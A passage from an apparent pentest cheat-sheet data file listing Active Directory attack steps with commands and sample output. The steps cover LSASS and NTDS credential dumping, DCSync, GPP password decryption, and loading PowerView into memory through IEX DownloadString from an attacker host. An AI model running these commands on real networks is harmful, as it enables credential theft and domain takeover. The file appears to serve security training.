          { title: 'Step 2: Check Registry Winlogon for Cleartext Autologon Credentials', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u administrator -p 'P@ss' -M reg-winlogon", out: "REG-WINLOGON  10.10.10.20  445  WEB01  DefaultDomainName: ACME\nREG-WINLOGON  10.10.10.20  445  WEB01  DefaultUserName: adm_bob\nREG-WINLOGON  10.10.10.20  445  WEB01  DefaultPassword: BobAutologon2026!", sig: 'DefaultPassword:', teach: 'Winlogon DefaultPassword is stored in cleartext in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.' }
        ]
      },
      {
        stage: 's1', label: 'Remote Impacket Secretsdump (SAM, LSA & Cached DCC2)', toolsLabel: 'impacket-secretsdump', locus: 'REMOTE',
        prereqNote: 'Needs: Local Admin on Target Host (Port 445)',
        when: 'Direct Impacket alternative to NetExec --sam --lsa. Saves the registry hives remotely via RemoteRegistry service, extracts SAM, LSA, and MSCache2 (DCC2) cached domain logons, and cleans up.',
        steps: [
          { title: 'Step 1: Run Remote Impacket Secretsdump Against Host', tool: 'impacket-secretsdump', where: 'local', run: "impacket-secretsdump 'acme.internal/administrator:P@ss'@10.10.10.20", out: "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\nACME.INTERNAL/adm_bob:$DCC2$10240#adm_bob#e4e938d12fe5974dc42c90120bd9f10f", sig: 'Administrator:500:', teach: 'Secretsdump pulls SAM, LSA secrets, and DCC2 cached domain credentials in one command.' }
        ]
      },
      {
        stage: 's1', label: 'Remote LSASS Memory Dump (-M lsassy)', toolsLabel: 'nxc smb -M lsassy', locus: 'REMOTE',
        prereqNote: 'Needs: Local Admin on Target Host (Port 445)',
        when: 'SAM and LSA do not hold the credentials of domain users who are interactively logged in or connected over RDP/WinRM right now; those live only in LSASS memory. lsassy dumps and parses LSASS remotely from Kali.',
        steps: [
          { title: 'Step 1: Dump & Parse Remote LSASS Memory with lsassy', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u administrator -p 'P@ss' -M lsassy", out: "LSASSY  10.10.10.20  445  WEB01  acme.internal\\da_admin  NT: 92b8147a03c6201f9a02109c9b2e0a51", sig: 'acme.internal\\da_admin', teach: 'Capturing a Domain Admin\'s NT hash from LSASS on a member server gives you instant Pass-the-Hash access to the DC.' }
        ]
      },
      {
        stage: 's2', label: 'Domain Controller NTDS.dit Dump (Secretsdump -just-dc / nxc --ntds)', toolsLabel: 'impacket-secretsdump -just-dc / nxc --ntds', locus: 'REMOTE',
        prereqNote: 'Needs: Domain Admin or DCSync Rights on the DC',
        when: 'Use against a Domain Controller to replicate NTLM hashes and Kerberos keys from NTDS.dit via DRSUAPI. Use -just-dc-user <name> on large domains to avoid dumping thousands of accounts.',
        deepLink: { id: 'dcsync', title: 'DCSync (Domain Hash Dump)' },
        steps: [
          { title: 'Step 1: Targeted Single-User DCSync (-just-dc-user)', tool: 'impacket-secretsdump', where: 'local', run: "impacket-secretsdump 'acme.internal/administrator:P@ss'@10.10.10.10 -just-dc-user Administrator", out: "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: 'Administrator:500:', teach: '-just-dc-user Administrator (or krbtgt) is instant and avoids noisy full-domain dumps.' },
          { title: 'Step 2: Full Domain NTDS Dump via NetExec (--ntds)', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --ntds", out: "SMB  10.10.10.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB  10.10.10.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1f92a38c44e01b8902ab10c92f811d2a:::", sig: 'krbtgt:502:', teach: 'Dumps all domain hashes and saves them to ~/.nxc/logs/.' }
        ]
      },
      {
        stage: 's2', label: 'Backup Operators / Diskshadow VSS -> Offline Secretsdump', toolsLabel: 'nxc -M backup_operator / diskshadow -> impacket-secretsdump LOCAL', locus: 'REMOTE',
        prereqNote: 'Needs: Backup Operators Group / SeBackupPrivilege',
        when: 'Members of Backup Operators cannot run DRSUAPI DCSync directly, but hold SeBackupPrivilege to copy NTDS.dit and the SYSTEM registry hive via Volume Shadow Copy (VSS), then parse them offline on Kali.',
        deepLink: { id: 'sebackup-serestore', title: 'SeBackupPrivilege / Backup Operators Abuse' },
        steps: [
          { title: 'Step 1: Automated Remote Backup Operator Dump (-M backup_operator)', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u svc_backup -p 'Backup2025!' -M backup_operator", out: "BACKUP_OP  10.10.10.10  445  DC01  [+] Copying SAM, SYSTEM, SECURITY and NTDS.dit via SeBackupPrivilege\nBACKUP_OP  10.10.10.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: 'Administrator:500:', teach: 'NetExec\'s backup_operator module automates the remote registry/NTDS backup and extraction.' },
          { title: 'Step 2: Offline Secretsdump Against Pulled NTDS.dit + SYSTEM Files', tool: 'impacket-secretsdump', where: 'local', run: 'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL', out: "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: 'Administrator:500:', teach: 'If you used diskshadow /s script.txt on the DC to copy ntds.dit and reg save HKLM\\SYSTEM, parse both files offline with LOCAL.' }
        ]
      },
      {
        stage: 's3', label: 'On-Target Interactive Shell: Mimikatz LSASS & Azure AD Connect', toolsLabel: 'mimikatz.exe / Azure-AD-Connect.ps1', locus: 'ON-TARGET',
        prereqNote: 'Needs: High-Integrity Admin or SYSTEM Foothold Shell',
        when: 'Use when you have an interactive Administrator/SYSTEM shell on the Windows target and want to extract live logon passwords, Kerberos tickets, or Azure AD Connect sync credentials.',
        steps: [
          { title: 'Step 1: Enable SeDebugPrivilege & Dump LSASS Logon Passwords', tool: 'mimikatz', where: 'host', run: '.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', out: "Privilege '20' OK\nAuthentication Id : 0 ; 419283\nUser Name         : adm_bob\nDomain            : ACME\n        * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71", sig: 'NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71', teach: 'privilege::debug enables SeDebugPrivilege so sekurlsa::logonpasswords can read LSASS process memory.' }
        ]
      }
    ],
    'ad-session-enum': [
      {
        label: 'NetExec Subnet Session & Logged-On User Sweep (Remote)', toolsLabel: 'nxc smb (--loggedon-users --sessions)', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 445',
        when: 'Sweep the subnet remotely from Kali to find which workstations or servers currently have a Domain Admin or high-value target user logged in.',
        steps: [
          { title: 'Step 1: Query Active SMB Sessions & Logged-On Users Across Subnet', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.0/24 -u jbloggs -p 'Autumn2026!' --loggedon-users --sessions", out: "SMB  10.10.10.20  445  SQL01  [+] acme.internal\\jbloggs:Autumn2026!\nSMB  10.10.10.20  445  SQL01  [+] Loggedon Users:\nSMB  10.10.10.20  445  SQL01  ACME\\adm_bob                   logon_server: DC01", sig: 'ACME\\adm_bob', teach: 'Finding ACME\\adm_bob logged into SQL01 tells you compromising SQL01 and dumping LSASS will yield adm_bob\'s credential.' }
        ]
      },
      {
        label: 'On-Target PowerView Local Admin & Session Hunter', toolsLabel: 'PowerView (Find-LocalAdminAccess -> Get-NetSession)', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold Shell',
        when: 'From a Windows foothold, first check where your current user holds local admin rights, then query active network sessions without needing local admin on the queried host.',
        steps: [
          { title: 'Step 1: Find Hosts Where Your User Holds Local Admin', tool: 'powershell', where: 'host', run: 'Find-LocalAdminAccess', out: 'SQL01.acme.internal', sig: 'SQL01.acme.internal', teach: 'Find-LocalAdminAccess tests administrative service manager access across every computer in the domain.' },
          { title: 'Step 2: Query Active Network Sessions on Target Host', tool: 'powershell', where: 'host', run: 'Get-NetSession -ComputerName SQL01.acme.internal | select CName,UserName,Time', out: "CName         UserName Time\n-----         -------- ----\n\\\\10.10.10.10 adm_bob  14", sig: 'adm_bob', teach: 'NetSessionEnum reveals who has an active session on SQL01 and which IP they connected from.' }
        ]
      },
      {
        label: 'On-Target Built-In qwinsta, query user & net session', toolsLabel: 'qwinsta -> net session (Built-In)', locus: 'ON-TARGET',
        prereqNote: 'Needs: Interactive Windows Foothold Shell',
        when: 'Living-off-the-land check on any Windows box you land on. Immediately shows if another user is logged into an active or disconnected RDP/console session on the same machine.',
        steps: [
          { title: 'Step 1: Check Active & Disconnected Desktop Sessions (qwinsta)', tool: 'cmd', where: 'host', run: 'qwinsta && net session 2>nul', out: " SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE\n services                                    0  Disc\n>console           jbloggs                   1  Active\n rdp-tcp#2         adm_bob                   2  Disc", sig: 'adm_bob', teach: 'A Disconnected (Disc) session for adm_bob means their credentials and Kerberos tickets are sitting in LSASS memory right now.' }
        ]
      }
    ],
    'ad-dc-identify': [
      {
        label: 'NetExec SMB Banner + Anonymous LDAP RootDSE (Remote)', toolsLabel: 'nxc smb -> ldapsearch -s base', locus: 'REMOTE',
        prereqNote: 'Needs: Target IP + Port 445/389 (Zero Credentials)',
        when: 'Fastest way from Kali to extract the exact Active Directory domain FQDN, DC hostname, defaultNamingContext (BaseDN), and OS build without credentials.',
        steps: [
          { title: 'Step 1: Read Domain & Hostname from SMB Signing Banner', tool: 'nxc', where: 'local', run: 'nxc smb 10.10.10.10', out: 'SMB  10.10.10.10  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:acme.internal) (signing:True) (SMBv1:False)', sig: '(domain:acme.internal)', teach: 'Add 10.10.10.10 dc01.acme.internal acme.internal to /etc/hosts immediately so Kerberos and LDAP tools resolve names properly.' },
          { title: 'Step 2: Query LDAP RootDSE for BaseDN (defaultNamingContext)', tool: 'ldapsearch', where: 'local', run: 'ldapsearch -x -H ldap://10.10.10.10 -s base defaultNamingContext dnsHostName', out: "dn:\ndefaultNamingContext: DC=acme,DC=internal\ndnsHostName: DC01.acme.internal", sig: 'defaultNamingContext: DC=acme,DC=internal', teach: 'RootDSE is readable without authentication on almost every Active Directory DC.' }
        ]
      },
      {
        label: 'DNS SRV Record Discovery (nslookup / dig against DC DNS)', toolsLabel: 'nslookup -type=SRV', locus: 'REMOTE',
        prereqNote: 'Needs: Port 53 Open on Target',
        when: 'Use when you have an IP Range or internal DNS server and need to locate every Domain Controller and KDC in the forest via standard SRV records.',
        steps: [
          { title: 'Step 1: Query _ldap._tcp.dc._msdcs SRV Records', tool: 'nslookup', where: 'local', run: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.acme.internal 10.10.10.10', out: '_ldap._tcp.dc._msdcs.acme.internal service = 0 100 389 dc01.acme.internal.\ndc01.acme.internal internet address = 10.10.10.10', sig: 'dc01.acme.internal', teach: 'Every Domain Controller registers under _ldap._tcp.dc._msdcs.<domain>.' }
        ]
      },
      {
        label: 'On-Target Built-In nltest & .NET Domain Object (Foothold Shell)', toolsLabel: 'nltest /dclist -> [System.DirectoryServices]', locus: 'ON-TARGET',
        prereqNote: 'Needs: Windows Foothold Shell',
        when: 'Use when you land a foothold on a member workstation or web server and need to identify the Primary Domain Controller (PDC) and forest topology using built-in OS tools.',
        steps: [
          { title: 'Step 1: List Domain Controllers with Built-In nltest.exe', tool: 'cmd', where: 'host', run: 'nltest /dclist:acme.internal', out: "Get list of DCs in domain 'acme.internal' from '\\\\DC01.acme.internal'.\n    DC01.acme.internal [PDC]  [DS] Site: Default-First-Site-Name", sig: 'DC01.acme.internal [PDC]', teach: 'nltest /dclist identifies every DC and marks which one holds the Primary Domain Controller [PDC] emulator role.' },
          { title: 'Step 2: Query Forest & Domain via Built-In .NET Class', tool: 'powershell', where: 'host', run: '[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()', out: "Forest                  : acme.internal\nDomainControllers       : {DC01.acme.internal}\nPdcRoleOwner            : DC01.acme.internal", sig: 'PdcRoleOwner', teach: 'Pure .NET call built into every Windows installation, so no external scripts are required.' }
        ]
      },
      {
        label: 'On-Target PowerView Domain & Controller Recon', toolsLabel: 'PowerView (Get-NetDomain -> Get-NetDomainController)', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold Shell',
        when: 'Use when PowerView is loaded in memory on your Windows foothold.',
        steps: [
          { title: 'Step 1: Query Domain & Controller Details via PowerView', tool: 'powershell', where: 'host', run: 'Get-NetDomain; Get-NetDomainController | select Name,IPAddress,OSVersion', out: "Name                 IPAddress   OSVersion\n----                 ---------   ---------\nDC01.acme.internal   10.10.10.10 Windows Server 2019 Standard", sig: 'DC01.acme.internal', teach: 'Reveals the DC hostname, IP address, and exact Server OS version.' }
        ]
      }
    ],
    'ad-path-manual': [
      {
        stage: 's1', label: 'Remote Outbound ACL & AdminCount Triage (Kali)', toolsLabel: 'nxc ldap -M daclread -> bloodyAD get writable', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389',
        when: 'Fastest way from Kali without BloodHound to see every AD object your user can modify and which accounts are protected high-value targets (adminCount=1).',
        deepLink: { id: 'bloodyad-acl', title: 'ACL Abuse with bloodyAD' },
        steps: [
          { title: 'Step 1: List Every Object Your User Can Modify (bloodyAD get writable)', tool: 'bloodyad', where: 'local', run: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' get writable", out: "distinguishedName: CN=svc_backup,CN=Users,DC=acme,DC=internal\npermission: WRITE", sig: 'permission: WRITE', teach: 'Directly surfaces outbound GenericAll/GenericWrite/WriteDacl edges held by your user or nested groups.' },
          { title: 'Step 2: Audit High-Value AdminCount Accounts & Group Memberships', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count -M group-mem -o GROUP='Domain Admins'", out: "LDAP       10.10.10.10  389  DC01  AdminCount: Administrator, svc_sql\nGROUP-MEM  10.10.10.10  389  DC01  Member: svc_sql", sig: 'AdminCount:', teach: 'Cross-reference writable objects against AdminCount accounts to find 1-hop or 2-hop escalation paths.' }
        ]
      },
      {
        stage: 's1', label: 'Remote Roasting, Delegation & ADCS Triage (Kali)', toolsLabel: 'nxc ldap (--asreproast --kerberoasting --trusted-for-delegation -M adcs)', locus: 'REMOTE',
        prereqNote: 'Needs: 1 Valid Domain User + Port 389',
        when: 'Sweeps the four most common non-ACL Active Directory escalation paths (AS-REP, Kerberoast, Unconstrained Delegation, and ADCS) in one pass from Kali.',
        deepLink: { id: 'adcs-esc', title: 'ADCS Misconfiguration Abuse' },
        steps: [
          { title: 'Step 1: Check Roastable Accounts & Delegation Hosts', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --asreproast asrep.txt --kerberoasting tgs.txt --trusted-for-delegation", out: "LDAP  10.10.10.10  389  DC01  $krb5tgs$23$*svc_sql$ACME.INTERNAL$...\nLDAP  10.10.10.10  389  DC01  APPSRV01$ (Trusted for delegation)", sig: 'Trusted for delegation', teach: 'Unconstrained delegation hosts (APPSRV01$) cache TGTs of any user who authenticates to them.' },
          { title: 'Step 2: Check ADCS CAs, MachineAccountQuota & User Descriptions', tool: 'nxc', where: 'local', run: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M adcs -M maq -M user-desc", out: "ADCS       10.10.10.10  389  DC01  CA Name: acme-DC01-CA\nMAQ        10.10.10.10  389  DC01  MachineAccountQuota: 10", sig: 'MachineAccountQuota: 10', teach: 'MachineAccountQuota > 0 enables RBCD and Certifried machine-account creation attacks.' }
        ]
      },
      {
        stage: 's2', label: 'On-Target PowerView Outbound ACL & DCSync Audit', toolsLabel: 'PowerView (Find-InterestingDomainAcl -> Get-DomainObjectAcl)', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold Shell',
        when: 'Use when operating inside a Windows foothold with PowerView loaded in memory to find outbound ACL edges and non-default DCSync principals.',
        deepLink: { id: 'ad-acl-abuse', title: 'Object ACL Abuse (PowerView & Built-In)' },
        steps: [
          { title: 'Step 1: Find Outbound ACLs Held by Your User or Groups', tool: 'powershell', where: 'host', run: ". .\\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match 'jbloggs|IT Support' } | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights", out: "IdentityReferenceName ObjectDN                               ActiveDirectoryRights\n--------------------- --------                               ---------------------\nIT Support            CN=svc_sql,CN=Users,DC=acme,DC=internal GenericAll", sig: 'GenericAll', teach: 'Filtering IdentityReferenceName for your username and group names isolates the exact edges you can exploit right now.' },
          { title: 'Step 2: Check Who Already Holds Replication (DCSync) Rights', tool: 'powershell', where: 'host', run: "Get-DomainObjectAcl -SearchBase 'DC=acme,DC=internal' -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get' } | select SecurityIdentifier,ObjectAceType", out: "SecurityIdentifier                            ObjectAceType\n------------------                            -------------\nS-1-5-21-192837465-11223344-55667788-1105     DS-Replication-Get-Changes-All", sig: 'DS-Replication-Get-Changes-All', teach: 'Convert the SID with Convert-SidToName to see which non-default account holds DCSync rights.' }
        ]
      },
      {
        stage: 's3', label: 'Living Off the Land: Built-In Windows Path Triage (Zero Uploads)', toolsLabel: 'whoami /all -> net user /domain -> setspn', locus: 'ON-TARGET',
        prereqNote: 'Needs: Windows Foothold Shell (Zero External Tools)',
        when: 'Use when AV/AppLocker blocks all scripts and binaries. Uses only built-in Windows binaries to map your nested group memberships, privileges, domain accounts, and SPNs.',
        steps: [
          { title: 'Step 1: Audit Token Groups, Privileges & Domain Admins', tool: 'cmd', where: 'host', run: 'whoami /groups && whoami /priv && net user jbloggs /domain && net group "Domain Admins" /domain', out: "SeImpersonatePrivilege        Impersonate a client after authentication   Enabled\nGlobal Group memberships     *Domain Users         *IT Support", sig: 'SeImpersonatePrivilege', teach: 'Always check both local token privileges (SeImpersonate, SeBackup) and nested domain group memberships.' }
        ]
      }
    ],
    'powerview-enum': [
      {
        stage: 's1', label: 'Stage PowerView in Memory & Map Domain / DCs / Trusts', toolsLabel: 'IEX DownloadString -> Get-NetDomain -> Get-NetDomainTrust', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerShell Foothold + HTTP Stage on Kali',
        when: 'Load PowerView.ps1 directly into memory from your Kali HTTP server so nothing touches disk, then map the domain, Domain Controllers, and forest trusts.',
        deepLink: { id: 'ad-dc-identify', title: 'Identify Domain Controllers' },
        steps: [
          { title: 'Step 1: Load PowerView.ps1 Into Memory Over HTTP', tool: 'powershell', where: 'host', run: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1')", out: 'PS C:\\>', sig: 'PS C:\\>', teach: 'Host PowerView.ps1 on Kali with python3 -m http.server 8000; if AMSI triggers, run the AMSI bypass one-liner first.' },
          { title: 'Step 2: Enumerate Domain, Controllers & Forest Trusts', tool: 'powershell', where: 'host', run: 'Get-NetDomain; Get-NetDomainController | select Name,IPAddress; Get-NetDomainTrust', out: "Forest                  : acme.internal\nName                    : DC01.acme.internal\nIPAddress               : 10.10.10.10", sig: 'DC01.acme.internal', teach: 'Confirms the primary DC IP and whether any cross-domain or forest trusts exist.' }
        ]
      },
      {
        stage: 's2', label: 'Enumerate Users, Groups & Kerberoastable SPN Accounts', toolsLabel: 'Get-NetUser -> Get-NetGroup -> Get-NetUser -SPN', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerView Loaded in Memory',
        when: 'Query all domain users (checking descriptions and password ages), enumerate groups, and list every service account with a registered SPN for Kerberoasting.',
        deepLink: { id: 'kerberoast', title: 'Kerberoasting' },
        steps: [
          { title: 'Step 1: List Users with Descriptions & Password Ages', tool: 'powershell', where: 'host', run: 'Get-NetUser | select cn,description,pwdlastset,lastlogon', out: "cn         description             pwdlastset          lastlogon\n--         -----------             ----------          ---------\njbloggs    Temp pass: Autumn2026!  10/14/2026 9:00 AM  10/24/2026 8:15 AM\nsvc_sql    SQL Service             3/14/2024 9:12 AM   10/20/2026 2:00 AM", sig: 'svc_sql', teach: 'Check description fields for cleartext passwords and pwdlastset for stale service accounts.' },
          { title: 'Step 2: Find Kerberoast Targets (Get-NetUser -SPN)', tool: 'powershell', where: 'host', run: 'Get-NetUser -SPN | select samaccountname,serviceprincipalname,memberof', out: "samaccountname serviceprincipalname                  memberof\n-------------- --------------------                  --------\nsvc_sql        {MSSQLSvc/sql01.acme.internal:1433}   {CN=Domain Admins...}", sig: 'MSSQLSvc/sql01.acme.internal', teach: 'Follow immediately with Invoke-Kerberoast or Rubeus.exe kerberoast.' }
        ]
      },
      {
        stage: 's3', label: 'Find Local Admin Access, Active Sessions & Readable Shares', toolsLabel: 'Find-LocalAdminAccess -> Get-NetSession -> Invoke-ShareFinder', locus: 'ON-TARGET',
        prereqNote: 'Needs: PowerView Loaded in Memory',
        when: 'Map lateral movement paths from your current foothold: where your user is already local admin, where high-value users are logged in, and which network shares are readable.',
        deepLink: { id: 'ad-session-enum', title: 'Active Session & Local Admin Enumeration' },
        steps: [
          { title: 'Step 1: Sweep Domain for Local Admin Access & Readable Shares', tool: 'powershell', where: 'host', run: "Find-LocalAdminAccess; Invoke-ShareFinder -Verbose | Select-String -Pattern 'READ'", out: "SQL01.acme.internal\n\\\\DC01.acme.internal\\Department   - READ", sig: 'SQL01.acme.internal', teach: 'Any host returned by Find-LocalAdminAccess can becompromised immediately via WMI, WinRM, or PsExec.' }
        ]
      }
    ],
    'lsass-dump-onbox': [
      {
        label: 'Built-In Comsvcs.dll MiniDump -> SMB Exfil -> Offline Pypykatz', toolsLabel: 'Get-Process -> rundll32 comsvcs.dll -> impacket-smbserver -> pypykatz', locus: 'ON-TARGET',
        prereqNote: 'Needs: Local Admin / SeDebugPrivilege on Windows Target',
        when: 'Preferred living-off-the-land LSASS dump when AV blocks Mimikatz on the host. Uses Microsoft-signed comsvcs.dll to write a crash dump of lsass.exe, transfers it to Kali, and parses it offline with pypykatz.',
        steps: [
          { title: 'Step 1: Find the LSASS Process ID (PID) on Target', tool: 'powershell', where: 'host', run: 'Get-Process lsass | select Id,ProcessName', out: " Id ProcessName\n -- -----------\n672 lsass", sig: '672 lsass', teach: 'Note the numerical PID (672) to pass into comsvcs.dll MiniDump.' },
          { title: 'Step 2: Dump LSASS Memory Using Built-In comsvcs.dll LOLBin', tool: 'cmd', where: 'host', run: 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', out: 'C:\\>', sig: 'C:\\>', teach: 'Must be run from an elevated (Administrator/SYSTEM) cmd.exe or PowerShell prompt.' },
          { title: 'Step 3: Exfiltrate lsass.dmp & Parse Offline on Kali with pypykatz', tool: 'pypykatz', where: 'local', run: 'pypykatz lsa minidump lsass.dmp', out: "== MSV ==\n\tUsername: adm_bob\n\tDomain: ACME\n\tNT: 58a478135a93ac3bf058a5ea0e8fdb71", sig: 'NT: 58a478135a93ac3bf058a5ea0e8fdb71', teach: 'Parsing the minidump offline on Kali never exposes Mimikatz to endpoint AV on the target.' }
        ]
      },
      {
        label: 'Sysinternals ProcDump.exe -> Offline Pypykatz', toolsLabel: 'procdump.exe -> pypykatz', locus: 'ON-TARGET',
        prereqNote: 'Needs: Local Admin / SYSTEM Shell on Target',
        when: 'Use when comsvcs.dll command-line signatures are monitored by Defender. Microsoft-signed Sysinternals procdump.exe creates a clean minidump of lsass.exe.',
        steps: [
          { title: 'Step 1: Dump LSASS with Microsoft-Signed ProcDump', tool: 'cmd', where: 'host', run: 'procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp', out: "[12:04:11] Dump 1 initiated: C:\\Windows\\Temp\\lsass.dmp\n[12:04:12] Dump 1 complete: 46 MB written in 0.8 seconds", sig: 'Dump 1 complete', teach: '-ma writes a full memory dump of the target process.' },
          { title: 'Step 2: Parse Dump Offline with Pypykatz on Kali', tool: 'pypykatz', where: 'local', run: 'pypykatz lsa minidump lsass.dmp', out: "== MSV ==\n\tUsername: adm_bob\n\tDomain: ACME\n\tNT: 58a478135a93ac3bf058a5ea0e8fdb71", sig: 'NT: 58a478135a93ac3bf058a5ea0e8fdb71', teach: 'Extract every logged-on user\'s NTLM hash, Kerberos tickets, and WDigest/SSP cleartext secrets.' }
        ]
      },
      {
        label: 'Remote From Kali: NetExec -M lsassy (No Interactive Shell Needed)', toolsLabel: 'nxc smb -M lsassy', locus: 'REMOTE',
        prereqNote: 'Needs: Local Admin Credentials + Port 445',
        when: 'Fastest option when port 445 is reachable from Kali: automates remote LSASS dumping, parsing, and cleanup in one command.',
        steps: [
          { title: 'Step 1: Run NetExec lsassy Module Remotely', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.20 -u administrator -p 'P@ss' -M lsassy", out: "LSASSY  10.10.10.20  445  SQL01  acme.internal\\adm_bob  NT: 58a478135a93ac3bf058a5ea0e8fdb71", sig: 'acme.internal\\adm_bob', teach: 'Automatically dumps LSASS over SMB and extracts active domain credentials.' }
        ]
      }
    ],
    'gpp-passwords': [
      {
        label: 'Automated NetExec SYSVOL GPP Spider (-M gpp_password)', toolsLabel: 'nxc smb -M gpp_password', locus: 'REMOTE',
        prereqNote: 'Needs: Port 445 (Null Session or Any Domain User)',
        when: 'Always try this first. NetExec automatically searches SYSVOL for Groups.xml, Services.xml, ScheduledTasks.xml, and DataSources.xml and decrypts any cpassword attribute on the spot.',
        steps: [
          { title: 'Step 1: Run Automated GPP Password Module (Null or Authenticated)', tool: 'nxc', where: 'local', run: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M gpp_password", out: "GPP_PASSWORD 10.10.10.10 445 DC01 [+] Found cpassword in Policies/{31B2F340-...}/Machine/Preferences/Groups/Groups.xml\nGPP_PASSWORD 10.10.10.10 445 DC01 [+] Username: ACME\\svc_localadmin | Password: GppAdmin2024!", sig: 'Password: GppAdmin2024!', teach: 'Microsoft published the static 32-byte AES key used for GPP cpassword encryption in MS14-025.' }
        ]
      },
      {
        label: 'Manual Share Dump -> Grep cpassword -> Offline gpp-decrypt', toolsLabel: 'smbclient -> grep -> gpp-decrypt', locus: 'REMOTE',
        prereqNote: 'Needs: Readable SMB Share (SYSVOL or Custom Backup Share)',
        when: 'Crucial when Group Policy XML files sit on a non-SYSVOL share (such as Replication, Backups, or IT) where automated SYSVOL-only modules miss them.',
        steps: [
          { title: 'Step 1: Recursively Download Share Contents via smbclient', tool: 'smbclient', where: 'local', run: "smbclient '//10.10.10.10/Replication' -N -c 'recurse ON; prompt OFF; mget *'", out: 'getting file \\Policies\\{31B2F340}\\Machine\\Preferences\\Groups\\Groups.xml', sig: 'Groups.xml', teach: 'recurse ON; prompt OFF; mget * mirrors the entire share tree onto your Kali working directory.' },
          { title: 'Step 2: Grep Downloaded XML Files for cpassword', tool: 'grep', where: 'local', run: 'grep -ri "cpassword" . 2>/dev/null', out: './Policies/{31B2F340}/Machine/Preferences/Groups/Groups.xml: userName="svc_localadmin" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"', sig: 'cpassword=', teach: 'Inspect both userName/newName and the cpassword ciphertext inside the XML tag.' },
          { title: 'Step 3: Decrypt AES Ciphertext Offline with gpp-decrypt', tool: 'gpp-decrypt', where: 'local', run: 'gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"', out: 'GppAdmin2024!', sig: 'GppAdmin2024!', teach: 'gpp-decrypt is pre-installed on Kali and decrypts any cpassword string offline.' }
        ]
      }
    ]
  };

  // --- Universal Approach Label & Context Synthesizer for All 346 Moves --------------------------
  function synthApproachLabel(m, c, idx) {
    if (c && c.label) return c.label;
    var run = String((c && c.run) || '').trim();
    var note = String((c && c.note) || '').trim();
    var tool = String((c && c.tool) || '').trim();

    if (note) {
      var mEsc = note.match(/^(ESC\d+(?:\/\d+)?(?:\s*\([^)]+\))?)\s*[:,-]?\s*([^.;]*)/i);
      if (mEsc) {
        var head = mEsc[1].trim();
        if (/\(/.test(head)) return head;
        var sub = (mEsc[2] || '').trim().split(/[.;,]/)[0].slice(0, 34);
        return sub ? (head + ': ' + sub.charAt(0).toUpperCase() + sub.slice(1)) : head;
      }
      var mStep = note.match(/^(Step\s+\d+\s*(?:\([^)]+\))?\s*:\s*[^.;,]+)/i);
      if (mStep) return mStep[1].trim().slice(0, 54);
      var mForExt = note.match(/^(For\s+a\s+\.[A-Za-z0-9]+)\s*:\s*([^.;]+)/i);
      if (mForExt) return (mForExt[1] + ' (' + tool + ')').trim();
    }

    if (/^(nxc|netexec|cme|crackmapexec)$/i.test(tool) || /^(nxc|netexec)\s+/i.test(run)) {
      var protoM = run.match(/(?:nxc|netexec)\s+(\S+)/i);
      var proto = protoM ? protoM[1].toUpperCase() : 'SMB';
      var mods = [], mm, mRe = /-M\s+([A-Za-z0-9_.-]+)/g;
      while ((mm = mRe.exec(run)) !== null) mods.push(mm[1]);
      if (mods.length) {
